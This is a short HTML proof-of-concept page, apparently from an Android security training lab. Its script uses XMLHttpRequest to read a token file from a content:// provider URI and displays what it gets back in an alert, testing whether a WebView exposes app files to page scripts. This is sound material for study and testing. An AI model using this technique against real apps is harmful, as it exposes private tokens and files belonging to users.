<!DOCTYPE html>
<html>
<head>
    <title>Test XMLHttpRequest with content://</title>
    <script type="text/javascript">
        function leakFileXHR(url) {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        alert("File Content:\n" + xhr.responseText);
                    } else {
                        alert("Failed to load file: " + xhr.status);
                    }
                }
            };
            xhr.onerror = function() {
                alert("Error occurred while loading the file.");
            };
            xhr.send();
        }
    </script>
</head>
<body>
    <h1>Test XMLHttpRequest with content://</h1>
    <button onclick="leakFileXHR('content://io.hextree.attacksurface.provider/token.txt')">Load File</button>
</body>
</html>
